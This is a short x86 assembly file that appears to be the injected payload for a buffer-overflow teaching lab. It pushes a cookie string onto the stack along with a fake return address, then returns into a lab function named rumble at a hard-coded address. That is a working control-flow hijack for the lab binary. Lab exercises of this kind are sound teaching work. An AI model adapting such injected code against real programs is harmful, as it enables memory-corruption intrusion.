#rumble.s
mov %esp, %ebp
#push $0x6e14d62d
push $0x00000000
push $0x44323644
push $0x34314536
mov %esp, %eax
push %eax	#the address of string
push $0x00111622	#"return address"
push $0x08049530	#address of function rumble
ret
